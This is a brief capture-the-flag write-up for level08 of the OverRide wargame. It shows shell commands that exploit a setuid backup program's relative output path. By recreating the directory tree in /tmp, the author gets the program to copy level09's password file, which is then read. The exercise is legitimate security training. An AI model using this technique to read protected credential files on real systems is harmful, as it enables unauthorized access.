The binary takes a file as an input :

./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)

level08@OverRide:~$ echo "test" > /tmp/test
level08@OverRide:~$ ./level08 /tmp/test
ERROR: Failed to open ./backups//tmp/test

We notice that the program tries to access a relative path ./backups.

Try with the .passwd file of level09 as input:

level08@OverRide:~$ ./level08 ~level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

The goal is then to replicate the same directory tree by going in /tmp :

cd /tmp
mkdir -p ./backups//home/users/level09

Then call the program :

~/level08 ~level09/.pass
cat backups/home/users/level09/.pass
